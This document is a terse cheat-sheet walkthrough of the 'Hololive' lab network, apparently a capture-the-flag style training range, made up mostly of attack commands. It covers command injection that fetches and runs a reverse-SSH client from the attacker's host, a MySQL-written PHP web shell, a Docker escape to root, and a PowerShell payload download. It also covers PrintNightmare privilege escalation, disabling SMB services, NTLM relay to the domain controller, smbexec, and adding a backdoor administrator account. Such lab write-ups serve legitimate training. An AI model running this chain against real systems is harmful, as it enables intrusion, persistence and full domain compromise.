# Hololive

This isn't so much a walkthrough as a sort of cheat sheet to plow through the machines. Instead of covenant, sshuttle or chisel I did all pivoting/forwarding using https://github.com/NHAS/reverse_ssh, which allowed me to treat each compromised machine as sort of a ssh server for which I had the private key using my attack box, which ran the server, as a jump host.

I also ran a webserver on port 1234 from the reverse ssh bin directory, to allow client binaries to be pulled.

## First machine

You need to log in over web first with the creds you can gain from file inclusion on dev.holo.live to admin.holo.live. Then the below will download the client and run it.

```
curl -H "Host: admin.holo.live" -H "Cookie: PHPSESSID=r77viip9g6kk79uharpdu94suq" "http://10.200.107.33/dashboard.php?cmd=curl+10.50.103.246%3a1234/client+>+/tmp/client+%26%26+chmod+%2bx+/tmp/client+%26%26+/tmp/client+10.50.103.246%3a3232"
```

## Escaping docker

The creds for the database are in db_connect.php.

```
mysql -u admin -h 192.168.100.1 -p
select '<?php system($_GET[1]) ?>' into outfile '/var/www/html/c.php';
curl "192.168.100.1:8080/c.php?1=curl+10.50.103.246%3a1234/client+>+/tmp/client+%26%26+chmod+%2bx+/tmp/client+%26%26+/tmp/client+10.50.103.246%3a3232"
```

## Privesc

```
/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
wget 10.50.103.246:1234/client -O /home/client && chmod 4555 /home/client
```

Then docker can be exited and the following run to get a root connection: `/home/client 10.50.103.246:3232`

## First windows machine

Reset gurags password to get access to the upload form. This can be done by requesting a reset, then passing the token that the reset responds with in the querystring.

Once done, upload a simple-php-shell.php that executes off cmd.

```
curl "http://10.200.107.31/images/simple-php-shell.php?cmd=powershell+%22%28New-Object+System.Net.WebClient%29.Downloadfile%28%27http%3A%2F%2F10.50.103.246%3A1234%2Fclient.exe%27%2C%27client.exe%27%29%22"
curl "http://10.200.107.31/images/simple-php-shell.php?cmd=client.exe+10.50.103.246%3A3232"
```

## Second windows machine, PC-FILESRV01

Set up a socks proxy on the attack box with  `ssh -ND 9050 -J localhost:3232 <id>`. Then install `rdesktop` and use it with proxychains: `proxychains rdesktop 10.200.107.35`.

The username is `HOLOLIVE/watamet`, with the password dumped from the previous machine using mimikatz.

Once you have a desktop, open powershell, navigate to `c:\windows\tasks`, and run:

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.50.103.246:1234/client.exe','client.exe')"
./client.exe 10.50.103.246:3232
```

## Privesc

The scheduled task approach seems broken. Instead use print nightmare.

```
scp -J 34.255.196.28:3232 .\CVE-2021-1675.ps1 bb73f51ee27097306880d119ab9cdc230ca258a2:c:\\windows\\Tasks\\cve.ps1
Import-Module ./cve.ps1
Invoke-Nightmare
runas /user:adm1n "c:\\windows\\tasks\\client.exe 10.50.103.246:3232"
```

## Final attack - ntlm setup

Ensure smb is not running on PC-FILESRV by running the following from a command prompt:

```
sc stop netlogon
sc stop lanmanserver
sc config lanmanserver start= disabled
sc stop lanmanworkstation
sc config lanmanworkstation start= disabled
shutdown -r
```

Note after shutdown you will need to re-establish connections, i.e. via rdesktop

Kill the service running on port 80 on the attackbox. It can be found with `netstat -tulpn`.

Install some prereqs and get the right version of impacket:

```
apt install krb5-user cifs-utils
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_22/impacket-0.9.22.tar.gz
tar -xf impacket-0.9.22.tar.gz
cd impacket-0.9.22
python3 -m pip install .
```

Setup a socks proxy to the target machine so ntlm relay will be able to attack the DC:

```
ssh -J 34.244.39.187:3232 -ND 172.22.176.1:9050 f9ab0daa2f97e94130d8c74a56ad9e055b3461ae
proxychains ntlmrelayx.py -t smb://10.200.107.30 -smb2support -socks
```

Set up a reverse port forward to capture smb packets:

```
ssh -NR 0.0.0.0:445:localhost:445 -J localhost:3232 bc930adddb17e253edfe31ed958c9e435ad31df3
```

## Accesing the DC

Once the ntlm relay establishes a socks proxy (you can check with the command `socks`) smbexec against this proxy allows rce.

First, setup a new socks proxy (possibly using a different machine, as I did):

```
socks4 <attackbox> 1080
```

Then use impacket's smbexec to get a very limited shell:

```
proxychains smbexec.py HOLOLIVE/SRV-ADMIN@10.200.114.30 -no-pass
```

Add a new admin user:

```
net user user1 pass123! /add
net localgroup Administrators /add user1
net localgroup "Remote Desktop Users" /add user1
```

Then use proxychains and rdesktop to login: `proxychains rdesktop 10.200.107.30`. Username will be `HOLOLIVE\user1`
